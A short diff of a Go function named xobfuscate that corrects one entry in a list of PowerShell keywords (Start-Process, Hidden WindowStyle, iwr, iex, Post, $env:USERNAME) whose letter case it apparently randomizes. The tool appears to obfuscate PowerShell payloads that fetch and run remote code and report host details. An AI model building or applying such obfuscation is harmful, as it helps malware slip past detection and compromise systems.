@@ -73,7 +73,7 @@ func xobfuscate(content string) string {
 	index--
 	
 	var uplow []string = []string {
-		"Start-Process", "Argument-List", "$PSHOME\\powershell.exe", "for", "try", "catch", "$env:USERNAME", "$env:COMPUTERNAME", "char", "UseBasicParsing", "Method", "Post", "Sleep", "if", "Out-String", "Body", "Hidden", "WindowStyle", "iwr", "iex", "Content",
+		"Start-Process", "ArgumentList", "$PSHOME\\powershell.exe", "for", "try", "catch", "$env:USERNAME", "$env:COMPUTERNAME", "char", "UseBasicParsing", "Method", "Post", "Sleep", "if", "Out-String", "Body", "Hidden", "WindowStyle", "iwr", "iex", "Content",
 	}
 
 	for i:=0;i<len(uplow);i++ {
